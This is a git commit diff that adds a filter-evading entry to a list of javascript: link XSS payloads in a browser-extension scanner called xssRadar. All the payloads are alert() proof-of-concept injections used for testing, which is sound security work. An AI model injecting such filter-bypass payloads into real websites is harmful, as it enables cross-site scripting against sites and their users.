d8a07e8400f93131d0e934e10db4a51957425ea8
EdOverflow <diopterasec@gmail.com>
2017-06-15 11:05:46 +0200

    Add more payloads.

--- extension/src/payloads/link.js
+++ extension/src/payloads/link.js
@@ -1,5 +1,6 @@
 xssRadar.scanner.payloads.link = [
   'javascript:alert({id})//',
   'javascript://%0Aalert({id});',
-  'javascript://a.com//%0Aalert({id});'
+  'javascript://a.com//%0Aalert({id});',
+  'java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert({id})'
 ]
